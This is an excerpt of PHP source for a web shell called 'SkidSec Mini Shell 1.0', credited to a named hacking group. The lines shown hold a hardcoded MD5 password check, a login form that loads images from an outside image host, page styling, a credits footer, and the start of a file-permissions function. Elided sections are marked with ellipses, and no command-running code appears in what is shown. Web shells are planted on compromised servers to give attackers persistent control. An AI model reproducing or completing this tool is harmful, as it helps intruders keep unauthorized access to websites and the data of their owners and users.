...
$password = "aab92e69374e4c7b8c6741fe02e574b9";

if(isset($_SESSION['logged_in'])== 'success'){
}else{
	if(md5($_POST['login'])!=$password){
		echo "
                <div class='login'>
                <center><img src='https://d.top4top.io/p_2359s9o271.png' width='250' height='250'></center>
			<form method='POST'>
...
<title>SkidSec Mini Shell</title>
<style>
body{
color: red;
...
<br>
<center><img src="https://d.top4top.io/p_2359s9o271.png" width="250" height="250"></center>
<H1><center>SkidSec Mini Shell</center></H1>
...
echo '<br /><br><br><br><font color="red">SkidSec Mini Shell 1.0</font><font color="blue">, Made By </font><font color="yellow">Ph.Kido - SkidSec Philippines</font>
</BODY>
</HTML>';
function perms($file){
